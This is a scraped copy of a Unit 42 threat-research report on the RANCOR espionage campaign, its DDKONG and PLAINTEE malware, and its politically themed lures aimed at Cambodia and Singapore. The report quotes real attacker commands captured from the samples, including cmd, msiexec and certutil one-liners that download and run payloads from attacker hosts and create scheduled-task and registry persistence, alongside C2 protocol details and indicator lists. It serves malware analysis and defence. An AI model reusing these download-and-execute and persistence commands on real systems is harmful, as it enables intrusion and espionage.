Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families. In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen. Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes.\r\nWe believe this group is previously unidentified and therefore have we have dubbed it \u201cRANCOR\u201d. The Rancor group\u2019s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers\u2019 toolkit.\u00a0 Countries Unit 42 has identified as targeted by Rancor with these malware families include, but are not limited to:\r\n\r\n \tSingapore\r\n \tCambodia\r\n\r\nWe identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages. These decoys contain details from public news articles focused primarily on political news and events. Based on this, we believe the Rancor attackers were targeting political entities.\u00a0 Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook.\r\nThe malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several \u201csofter\u201d linkages.\r\n&nbsp;\r\nLinking the attacks\r\nBuilding on our previous research into KHRAT Trojan, we have been monitoring KHRAT command and control domains. In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97. We made this IP the center of our investigation.\r\nExamining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies. One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address.\r\nThe following table depicts the two malware samples that are directly related to this IP address:\r\n\r\n\r\n\r\nSHA256\r\nDescription\r\nConnection to IP\r\n\u00a0\r\n\r\n\r\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\r\nLoader\r\nC2 facebook-apps.com (resolves to 89.46.222.97)\r\n\r\n\r\nc35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\r\nPLAINTEE\r\nHosted on 89.46.222.97\r\n\r\n\r\n\r\n&nbsp;\r\nDigging in further, the malware family we later named \u201cPLAINTEE\u201d appears to be quite unique with only six samples present in our data set.\r\nApart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were able to link all PLAINTEE samples together by the infrastructure they use. The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B\u00a0for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two.\r\n\r\nFigure 1 - Diagram showing the split of PLAINTEE samples across the two clusters of activity.\r\n&nbsp;\r\nOur Investigation into both clusters further showed that they were both involved in attacks targeting organizations in South East Asia. Based on the use of the relatively unique PLAINTEE malware, the malware\u2019s use of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under the RANCOR campaign moniker.\r\n&nbsp;\r\nDelivery &amp; Loader mechanisms\r\nFor many of the samples we\u2019ve been unable to identify how they were delivered to end victims; however, in three cases we were able to locate the files used to deliver the Trojan, which we found merited more investigation and are briefly discussed below.\r\n&nbsp;\r\nCluster A\r\nCase 1: Delivery via document property macro \u2013 a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483\r\n\u00a0In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware. Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document.\r\nBy doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious\u2019 codes small footprint can help enable evasion of automated detection mechanisms based on macro content.\r\n\r\nFigure 2 \u2013 The entire contents of the macro\r\n&nbsp;\r\nThe 'Company' field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:\r\ncmd \/c set \/p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec \/q \/i\r\n http:\/\/199.247.6.253\/ud^\",false,0 &lt;nul &gt;\r\nC:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs &amp; schtasks \/create \/sc MINUTE\r\n\/tn \"Windows System\" \/tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\r\n\/mo 2 \/F &amp; schtasks \/create \/sc MINUTE \/tn \"Windows System\" \/tr\r\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" \/mo 2 \/RU SYSTEM \/c set\r\n\/p=Set v=CreateObject(^\"Wscript.Shell^\"):v.Run ^\"msiexec \/q \/i\r\nhttp:\/\/199.247.6.253\/ud^\",false,0 &lt;nul &gt;\r\nC:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs &amp; schtasks \/create \/sc MINUTE\r\n\/tn \"Windows System\" \/tr \"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\"\r\n\/mo 2 \/F &amp; schtasks \/create \/sc MINUTE \/tn \"Windows System\" \/tr\r\n\"C:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\" \/mo 2 \/RU SYSTEM\r\n\r\n&nbsp;\r\nCluster B\r\nCase 2: Delivery via HTA Loader - 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\r\n\u00a0In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment. When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3).\r\n&nbsp;\r\n\r\nFigure 3 \u2013 The decoy image loaded when the .HTA file is executed.\r\n&nbsp;\r\nThe decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity in Cambodia. The Cambodia National Rescue Party is a politically motivated opposition movement.\r\n&nbsp;\r\nCase 3: Delivery via DLL Loader -\r\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\r\n\u00a0We identified three unique DLL loaders during this analysis. The loaders are extremely simple with a single exported function and are responsible for executing a single command. An exemplar command is given below:\r\ncmd \/c Echo CreateObject(\"WScript.Shell\").Run \"msiexec \/q \/i\r\nhttp:\\\\dlj40s.jdanief[.]xyz\/images\/word3.doc\",0\r\n&gt;%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs \/c Echo\r\nCreateObject(\"WScript.Shell\").Run \"msiexec \/q \/i\r\nhttp:\\\\dlj40s.jdanief[.]xyz\/images\/word3.doc\",0\r\n&gt;%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\r\nschtasks \/create \/sc MINUTE \/tn \"Windows Scheduled MaintenBa\" \/tr \"wscript\r\n%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" \/mo 10 \/F \/create \/sc\r\nMINUTE \/tn \"Windows Scheduled MaintenBa\" \/tr \"wscript\r\n%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" \/mo 10 \/F\r\ncmd \/c certutil.exe -urlcache -split -f\r\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz\/images\/1.pdf C:\\ProgramData\\1.pdf&amp;start\r\nC:\\ProgramData\\1.pdf \/c certutil.exe -urlcache -split -f\r\nhttp:\\\\\\\\dlj40s.jdanief[.]xyz\/images\/1.pdf C:\\ProgramData\\1.pdf&amp;start\r\nC:\\ProgramData\\1.pdf\r\n\r\nIn the above command, the malware is downloading and executing a payload and configuring it for persistent execution. In two of the three examples, the malware also downloads and opens a decoy PDF document hosted on a legitimate but compromised website. The decoy documents seen in these cases were related to Cambodian news articles, an example is shown in Figure 4 below.\r\n&nbsp;\r\n\r\nFigure 4 - 1.pdf decoy delivered by downloader\r\n&nbsp;\r\nThe decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar theme to the decoy document observed in Figure 3.\r\nIt is worth noting that the third DLL mentioned attempts to download the decoy document from a government website. This same website was used previously in a KHRat campaign targeting Cambodian citizens.\r\nAdditionally, two of the three DLL loaders were found to be hosted on this same compromised website, implying that it was likely compromised again in early 2018. The filenames for these two DLL loaders are as follows:\r\n\r\n \tActivity Schedule.pdf\r\n \t\u17a2\u17d2\u1793\u1780\u1793\u1799\u17c4\u1794\u17b6\u1799\u1780\u17d2\u1794\u178f\u17cb\u179b\u17be\u1780\u17d2\u1794\u178f (Translated from Khmer: Politicians betrayed on the betrayal)\r\n\r\nMalware Overview\r\nIn all cases where we were able to identify the final payloads used, the DDKONG\u00a0 or PLAINTEE malware families were used. We observed DDKONG in use between February 2017 and the present, while PLAINTEE is a newer addition with the earliest known sample being observed in October 2017. It\u2019s unclear if DDKONG is only used by one threat actor or more than one based on the data available.\r\nIn this section we\u2019ll go over the capabilities and operation of these malware families.\r\n&nbsp;\r\nDDKONG\r\nFor the analysis below, we used the following file:\r\n&nbsp;\r\n\r\n\r\n\r\nSHA256\r\n119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0\r\n\r\n\r\nSHA1\r\n25ba920cb440b4a1c127c8eb0fb23ee783c9e01a\r\n\r\n\r\nMD5\r\n6fa5bcedaf124cdaccfa5548eed7f4b0\r\n\r\n\r\nCompile Time\r\n2018-03-14 07:20:11 UTC\r\n\r\n\r\nFile Type\r\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\r\n\r\n\r\n\r\n&nbsp;\r\nTable 1 \u2013 DDKONG sample analyzed in full.\r\n&nbsp;\r\nThe malware in question is configured with the following three exported functions:\r\n\r\n \tServiceMain\r\n \tRundll32Call\r\n \tDllEntryPoint\r\n\r\nThe ServiceMain exported function indicates that this DLL is expected to be loaded as a service. If this function is successfully loaded, it will ultimately spawn a new instance of itself with the Rundll32Call export via a call to rundll32.exe.\r\nThe Rundll32Call exported function begins by creating a named event named \u2018RunOnce\u2019. This event ensures that only a single instance of DDKong is executed at a given time. If this is the only instance of DDKong running at the time, the malware continues. If it\u2019s not, it dies. This ensures that only a single instance of DDKong is executed at a given time.\r\nDDKong attempts to decode an embedded configuration using a single byte XOR key of 0xC3. Once decoded, the configuration contains the data shown in Figure 5 below.\r\n\r\nFigure 5 - Decoded configuration with fields highlighted\r\n&nbsp;\r\nAfter this configuration is decoded and parsed, DDKONG proceeds to send a beacon to the configured remote server via a raw TCP connection. The packet has a header of length 32 and an optional payload. In the beacon, no payload is provided, and as such, the length of this packet is set to zero.\r\n\r\nFigure 6 \u2013 DDKONG beacon to remote C2\r\n&nbsp;\r\nAfter it sends the beacon, the malware expects a response command of either 0x4 or 0x6. Both responses instruct the malware to download and load a remote plugin. In the event 0x4 is specified, the malware is instructed to load the exported \u2018InitAction\u2019 function. If 0x6 is specified, the malware is instructed to load the exported \u2018KernelDllCmdAction\u2019 function. Prior to downloading the plugin, the malware downloads a buffer that is concatenated with the embedded configuration and ultimately provided to the plugin at runtime. An example of this buffer at runtime is below:\r\n&nbsp;\r\n00000000: 43 3A 5C 55 73 65 72 73\u00a0 5C 4D 53 5C 44 65 73 6B\u00a0 C:\\Users\\MS\\Desk\r\n00000010: 74 6F 70 5C 52 53 2D 41\u00a0 54 54 20 56 33 5C 50 6C\u00a0 top\\RS-ATT V3\\Pl\r\n00000020: 75 67 69 6E 42 69 6E 00\u00a0 00 00 00 00 00 00 00 00\u00a0 uginBin.........uginBin.........\r\n[TRUNCATED]\r\n00000100: 00 00 00 00 43 3A 5C 55\u00a0 73 65 72 73 5C 4D 53 5C\u00a0 ....C:\\Users\\MS\\\r\n00000110: 44 65 73 6B 74 6F 70 5C\u00a0 52 53 2D 41 54 54 20 56\u00a0 Desktop\\RS-ATT V\r\n00000120: 33 5C 5A 43 6F 6E 66 69\u00a0 67 00 00 00 00 00 00 00\u00a0 3\\ZConfig.......ZConfig.......\r\n[TRUNCATED]\r\n00000200: 00 00 00 00 00 00 00 00\u00a0 00 40 00 00 F0 97 B5 01\u00a0 .........@......\r\n&nbsp;\r\nAs we can see in the above text, two full file paths are included in this buffer, providing us with insight into the original malware family\u2019s name, as well as the author. After this buffer is collected, the malware downloads the plugin and loads the appropriate function. During runtime, the following plugin was identified:\r\n&nbsp;\r\n\r\n\r\n\r\nSHA256\r\n0517b62233c9574cb24b78fb533f6e92d35bc6451770f9f6001487ff9c154ad7\r\n\r\n\r\nSHA1\r\n03defdda9397e7536cf39951246483a0339ccd35\r\n\r\n\r\nMD5\r\na5164c686c405734b7362bc6b02488cb\r\n\r\n\r\nCompile Time\r\n2018-03-28 01:54:40 UTC\r\n\r\n\r\nFile Type\r\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\r\n\r\n\r\n\r\nTable 2 \u2013 Plugin downloaded during runtime for DDKong sample.\r\n&nbsp;\r\nThis plugin provides the attacker with the ability to both list files and download\/upload files on the victim machine.\r\n&nbsp;\r\nPLAINTEE\r\nIn total we have been able to find six samples of PLAINTEE, which, based on our analysis, seems to be exclusively used by the RANCOR attackers. PLAINTEE is unusual in that it uses a custom UDP protocol for its network communications. For this walk through, we use the following sample:\r\n\r\n\r\n\r\nSHA256\r\nc35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\r\n\r\n\r\nSHA1\r\n0bdb44255e9472d80ee0197d0bfad7d8eb4a18e9\r\n\r\n\r\nMD5\r\nd5679158937ce288837efe62bc1d9693\r\n\r\n\r\nCompile Time\r\n2018-04-02 07:57:38 UTC\r\n\r\n\r\nFile Type\r\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\r\n\r\n\r\n\r\nTable 3 \u2013 PLAINTEE sample analyzed in full.\r\nThis sample is configured with three exported functions:\r\n\r\n \tAdd\r\n \tSub\r\n \tDllEntryPoint\r\n\r\nThe DLL expects the export named 'Add' to be used when initially loaded. When this function is executed PLAINTEE executes the following command in a new process to add persistence:\r\ncmd.exe \/c reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\\r\nCurrentVersion\\RunOnce\" \/v \"Microsoft Audio\" \/t REG_SZ \/d \"%APPDATA%\\Network\r\nService.exe\" \"[path_to_PLAINTEE]\",Add \/freg add\r\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\ CurrentVersion\\RunOnce\" \/v\r\n\"Microsoft Audio\" \/t REG_SZ \/d \"%APPDATA%\\Network Service.exe\"\r\n\"[path_to_PLAINTEE]\",Add \/f\r\n\r\nNext, the malware calls the \u2018Sub\u2019 function which begins by spawning a mutex named \u2018microsoftfuckedupb\u2019 to ensure only a single instance is running at a given time. In addition, PLAINTEE will create a unique GUID via a call to CoCreateGuid() to be used as an identifier for the victim. The malware then proceeds to collect general system enumeration data about the infected machine and enters a loop where it will decode an embedded config blob and send an initial beacon to the C2 server.\r\nThe configuration blob is encoded using a simple single-byte XOR scheme. The first byte of the string is used as the XOR key to in turn decode the remainder of the data.\r\n&nbsp;\r\nDecoding this blob yields the following information, also found within the original binary:\r\n&nbsp;\r\n\r\n\r\n\r\nOffset\r\nDescription\r\n\r\n\r\n0x4\r\nC2 port (0x1f99 \u2013 8089)\r\n\r\n\r\n0x8\r\nC2 host (45.76.176[.]236)\r\n\r\n\r\n0x10C\r\nFlag used to identify the malware in network communications. (default flag:4\/2\/2018 1:01:33 AM)\r\n\r\n\r\n\r\nTable 4 \u2013 Configuration stored in the malware.\r\n&nbsp;\r\nThe malware then proceeds to beacon to the configured port via a custom UDP protocol. The network traffic is encoded in a similar fashion, with a random byte being selected as the first byte, which is then used to decode the remainder of the packet via XOR.\u00a0 An example of the decoded beacon is show in Figure 7.\r\n\r\nFigure 7 PLAINTEE example beacon\r\n&nbsp;\r\nThe structure for this beacon is given in Table 5.\r\n&nbsp;\r\n\r\n\r\n\r\nOffset\r\nDescription\r\n\r\n\r\n0x0\r\nVictim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)\r\n\r\n\r\n0x25\r\nVictim IP Address (192.168.180.154)\r\n\r\n\r\n0x45\r\nCommand (0x66660001)\r\n\r\n\r\n0x49\r\nLength of payload (0x2f \u2013 47)\r\n\r\n\r\n0x4d\r\nField 1 - Windows major version (0x6 \u2013 Windows Vista+)\r\n\r\n\r\n0x51\r\nField 2 - Windows minor version (0x1 \u2013 Windows 7)\r\n\r\n\r\n0x55\r\nField 3 - Unknown (0x20)\r\n\r\n\r\n0x59\r\nPayload (default flag:4\/2\/2018 1:01:33 AM)\r\n\r\n\r\n\r\nTable 5 \u2013 Beacon structure for PLAINTEE.\r\n&nbsp;\r\nThis beacon is continuously sent out until a valid response is obtained from the C2 server (there is no sleep timer set). After the initial beacon, there is a two second delay in between all other requests made. This response is expected to have a return command of 0x66660002 and to contain the same GUID that was sent to the C2 server. Once this response is received, the malware spawns several new threads, with different Command parameters, with the overall objective of loading and executing a new plugin that is to be received from the C2 server.\r\nDuring a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample. The retrieved plugin was as follows:\r\n\r\n\r\n\r\nSHA256\r\nb099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78\r\n\r\n\r\nSHA1\r\nac3f20ddc2567af0b050c672ecd59dddab1fe55e\r\n\r\n\r\nMD5\r\n7c65565dcf5b40bd8358472d032bc8fb\r\n\r\n\r\nCompile Time\r\n2017-09-25 00:54:18 UTC\r\n\r\n\r\nFile Type\r\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\r\n\r\n\r\n\r\nTable 6 \u2013 PLAINTEE plugin observed in Wildfire\r\n&nbsp;\r\nPLAINTEE expects the downloaded plugin to be a DLL with an export function of either 'shell' or 'file'. The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.\u00a0 The following commands were observed:\r\n\r\n \ttasklist\r\n \tipconfig \/all\r\n\r\nThe attacker performed these two commands 33 seconds apart. As automated commands are typically performed more quickly this indicates that they may have been sent manually by the attacker.\r\n&nbsp;\r\nConclusions\r\nThe RANCOR campaign represents a continued trend of targeted attacks against entities within the South East Asia region. In a number of instances, politically motivated lures were used to entice victims into opening and subsequently loading previously undocumented malware families. These families made use of custom network communication to load and execute various plugins hosted by the attackers. Notably the PLAINTEE malwares\u2019 use of a custom UDP protocol is rare and worth considering when building heuristics detections for unknown malware. Palo Alto Networks will continue to monitor these actors, their malware, and their infrastructure going forward.\r\nPalo Alto Networks customers are protected against the threats discussed in this blog in the following ways:\r\n\r\n \tWildfire correctly identifies all samples discussed as malicious.\r\n \tTraps appropriately blocks the malware from executing.\r\n \tAutoFocus customers may track this threat via the KHRAT, DDKONG, PLAINTEE, and RANCOR tags.\r\n\r\nAdditional mitigations that could help to prevent attacks like these from succeeding in your environment include:\r\n\r\n \tChanging the default handler for \u201c.hta\u201d files in your environment so that they cannot be directly executed.hta\u201d files in your environment so that they cannot be directly executed.\r\n\r\n&nbsp;\r\n Appendix A \u2013 PLAINTEE older variant\r\nOlder variants of PLAINTEE can be identified via the unique mutex created during runtime. At least three variants of PLAINTEE have been identified to date, however, the following two samples have additional unique differences:\r\n&nbsp;\r\n\r\n\r\n\r\nHash\r\nFunctions\r\nMutex\r\n\r\n\r\nbcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e\r\nhelloworld\r\nhelloworld1,helloworld2,sqmAddTostream,DllEntryPoint\r\nmicrosoftfuckedup\r\n\r\n\r\n6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31\r\n\r\n\r\n\r\n&nbsp;\r\nThe following actions are performed with the additional functions:\r\n\r\n \thelloworld - performs actions identical to the newer sample\u2019s \u2018Sub\u2019 function\r\n \thelloworld1 \u2013 accepts command-line arguments, performs a UAC bypass\r\n \thelloworld2 \u2013 drops and compiles a mof filemof file\r\n\r\n\r\n \tsqmAddTostream \u2013 expected to run initially by the malware, checks OS version and loads the malware with helloworld2\r\n\r\n&nbsp;\r\nAppendix B\r\n\r\n\r\n\r\nType\r\nValue\r\nCluster\r\n\r\n\r\nLoaders\r\n\r\n\r\nHash\r\n0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855\r\nB\r\n\r\n\r\nHash\r\n1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458\r\nB\r\n\r\n\r\nDomain\r\nwww.facebook-apps.com\r\nB\r\n\r\n\r\nDomain\r\ndlj40s.jdanief.xyz\r\nB\r\n\r\n\r\nIP\r\n89.46.222.97\r\nB\r\n\r\n\r\nHash\r\na789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483\r\nA\r\n\r\n\r\nPLAINTEE\r\n\r\n\r\nHash\r\n863a9199decf36895d5d7d148ce9fd622e825f393d7ebe7591b4d37ef3f5f677\r\nA\r\n\r\n\r\nHash\r\n22a5bd54f15f33f4218454e53679d7cfae32c03ddb6ec186fb5e6f8b7f7c098b\r\nA\r\n\r\n\r\nHash\r\nc35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d\r\nB\r\n\r\n\r\nIP\r\n199.247.6.253\r\nA\r\n\r\n\r\nIP\r\n45.76.176.236\r\nA\r\n\r\n\r\nMutex\r\nmicrosoftfuckedupb\r\nA\r\n\r\n\r\nHash\r\n9f779d920443d50ef48d4abfa40b43f5cb2c4eb769205b973b115e04f3b978f5\r\nA\r\n\r\n\r\nHash\r\nbcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e\r\nA\r\n\r\n\r\nHash\r\n6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31\r\nA\r\n\r\n\r\nHash\r\nb099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78\r\nA\r\n\r\n\r\nDomain\r\ngoole.authorizeddns.us\r\nA\r\n\r\n\r\nMutex\r\nMicrosoftfuckedup\r\nA\r\n\r\n\r\nIP\r\n103.75.189.74\r\nA\r\n\r\n\r\nIP\r\n131.153.48.146\r\nA\r\n\r\n\r\nDDKONG\r\n\r\n\r\nHash\r\n15f4c0a589dff62200fd7c885f1e7aa8863b8efa91e23c020de271061f4918eb\r\nA\r\n\r\n\r\nDomain\r\nmicrosoft.authorizeddns.us\r\nA\r\n\r\n\r\nIP\r\n103.75.191.177\r\nA\r\n\r\n\r\nHash\r\n0f102e66bc2df4d14dc493ba8b93a88f6b622c168e0c2b63d0ceb7589910999d\r\nA\r\n\r\n\r\nHash\r\n84607a2abfd64d61299b0313337e85dd371642e9654b12288c8a1fc7c8c1cf0a\r\nA\r\n\r\n\r\nHash\r\na725abb8fe76939f0e0532978eacd7d4afb4459bb6797ec32a7a9f670778bd7e\r\nA\r\n\r\n\r\nHash\r\n82e1e296403be99129aced295e1c12fbb23f871c6fa2acafab9e08d9a728cb96\r\nA\r\n\r\n\r\nHash\r\n9996e108ade2ef3911d5d38e9f3c1deb0300aa0a82d33e36d376c6927e3ee5af\r\nA\r\n\r\n\r\nDomain\r\nwww.google_ssl.onmypc.org\r\nA\r\n\r\n\r\nHash\r\n18e102201409237547ab2754daa212cc1454f32c993b6e10a0297b0e6a980823\r\nA\r\n\r\n\r\nIP\r\n103.75.191.75\r\nA\r\n\r\n\r\nHash\r\nc78fef9ef931ffc559ea416d45dc6f43574f524ba073713fddb79e4f8ec1a319\r\nA\r\n\r\n\r\nHash\r\n01315e211bac543195f2c703033ba31b229001f844854b147c4b2a0973a7d17b\r\nA\r\n\r\n\r\nHash\r\nb8528c8e325db76b139d46e9f29835382a1b48d8941c47060076f367539c2559\r\nA\r\n\r\n\r\nHash\r\ndf14de6b43f902ac8c35ecf0582ddb33e12e682700eb55dc4706b73f5aed40f6\r\nA\r\n\r\n\r\nHash\r\n177906cb9170adc26082e44d9ad1b3fbdcba7c0b57e28b614c1b66cc4a99f906\r\nA\r\n\r\n\r\nHash\r\n113ae6f4d6a2963d5c9a7f42f782b176da096d17296f5a546433f7f27f260895\r\nA\r\n\r\n\r\nDomain\r\nftp.chinhphu.ddns.ms\r\nA\r\n\r\n\r\nHash\r\n128adaba3e6251d1af305a85ebfaafb2a8028eed3b9b031c54176ca7cef539d2\r\nA\r\n\r\n\r\nDomain\r\nwww.microsoft.https443.org\r\nA\r\n\r\n\r\nIP\r\n45.121.146.26\r\nA\r\n\r\n\r\nHash\r\n5afbee76af2a09c173cf782fd5e51b5076b87f19b709577ddae1c8e5455fc642\r\nA\r\n\r\n\r\nDomain\r\nmsdns.otzo.com\r\nA\r\n\r\n\r\nHash\r\n119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0\r\nA\r\n\r\n\r\nDomain\r\ngoole.authorizeddns.us\r\nA\r\n\r\n\r\nIP\r\n103.75.189.74\r\nA\r\n\r\n\r\n","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2018\/04\/unit42-blog-600x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Brittany Barbehenn"},{"@type":"Person","name":"Josh Grunzweig"},{"@type":"Person","name":"Tom Lancaster"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />

Based on the evidence, these attacks appear to be conducted by the same set of attackers using previously unknown malware families. In addition, these attacks appear to be highly targeted in their distribution of the malware used, as well as the targets chosen. Based on these factors, Unit 42 believes the attackers behind these attacks are conducting their campaigns for espionage purposes.<br />
We believe this group is previously unidentified and therefore have we have dubbed it “RANCOR”. The Rancor group’s attacks use two primary malware families which we describe in depth later in this blog and are naming DDKONG and PLAINTEE. DDKONG is used throughout the campaign and PLAINTEE appears to be new addition to these attackers’ toolkit.  Countries Unit 42 has identified as targeted by Rancor with these malware families include, but are not limited to:</p>
<ul>
<li>Singapore</li>
<li>Cambodia</li>
</ul>
<p>We identified decoy files which indicate these attacks began with spear phishing messages but have not observed the actual messages. These decoys contain details from public news articles focused primarily on political news and events. Based on this, we believe the Rancor attackers were targeting political entities.  Additionally, these decoy documents are hosted on legitimate websites including a government website belonging to the Cambodia Government and in at least once case, Facebook.<br />
The malware and infrastructure used in these attacks falls into two distinct clusters, which we are labeling A and B, that are linked through their use of the PLAINTEE malware and several “softer” linkages.<br />
&nbsp;<br />
<span style="font-size: 18pt">Linking the attacks</span><br />
Building on our previous research into <a href="https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/">KHRAT Trojan</a>, we have been monitoring KHRAT command and control domains. In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97. We made this IP the center of our investigation.<br />
Examining passive DNS (pDNS) records from <a href="https://www.riskiq.com/products/passivetotal/">PassiveTotal</a> revealed several domain names associated with this IP that mimic popular technology companies. One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address.<br />
The following table depicts the two malware samples that are directly related to this IP address:</p>

</table>
<p>&nbsp;<br />
Digging in further, the malware family we later named “PLAINTEE” appears to be quite unique with only six samples present in our data set.<br />
Apart from one sample (c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d), we were able to link all PLAINTEE samples together by the infrastructure they use. The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See <a href="#AppendixB">Appendix B</a> for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two.<br />

<p style="text-align: center"><em>Figure 1 &#8211; Diagram showing the split of PLAINTEE samples across the two clusters of activity.</em></p>
<p>&nbsp;<br />
Our Investigation into both clusters further showed that they were both involved in attacks targeting organizations in South East Asia. Based on the use of the relatively unique PLAINTEE malware, the malware’s use of the same file paths on in each cluster, and the similar targeting, we have grouped these attacks together under the RANCOR campaign moniker.<br />
&nbsp;<br />
<span style="font-size: 18pt">Delivery &amp; Loader mechanisms</span><br />
For many of the samples we’ve been unable to identify how they were delivered to end victims; however, in three cases we were able to locate the files used to deliver the Trojan, which we found merited more investigation and are briefly discussed below.<br />
&nbsp;<br />
<strong>Cluster A</strong><br />
Case 1: Delivery via document property macro – a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483<br />
<strong> </strong>In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware. Interestingly, the delivery document borrowed a technique which was <a href="https://threatpost.com/updates-to-sofacy-turla-highlight-2017-q2-apt-activity/127297/">publicized in late 2017 as being used by the Sofacy threat actors</a>, embedding the main malicious code in a EXIF metadata property of the document.<br />
By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious’ codes small footprint can help enable evasion of automated detection mechanisms based on macro content.<br />

The &#8216;Company&#8217; field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

Case 2: Delivery via HTA Loader &#8211; 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458<br />
<strong> </strong>In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment. When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3).<br />
&nbsp;<br />

<p style="text-align: center"><em>Figure 3 – The decoy image loaded when the .HTA file is executed.</em></p>
<p>&nbsp;<br />
The decoy in Figure 3 strongly suggests the attackers were conducting an attack against a political entity in Cambodia. The Cambodia National Rescue Party is a politically motivated opposition movement.<br />

<p>In the above command, the malware is downloading and executing a payload and configuring it for persistent execution. In two of the three examples, the malware also downloads and opens a decoy PDF document hosted on a legitimate but compromised website. The decoy documents seen in these cases were related to Cambodian news articles, an example is shown in Figure 4 below.<br />

<p style="text-align: center"><em>Figure 4 &#8211; 1.pdf decoy delivered by downloader</em></p>
<p>&nbsp;<br />
The decoy above discusses a recent event that took place against political party supporters in Cambodia, a similar theme to the decoy document observed in Figure 3.<br />
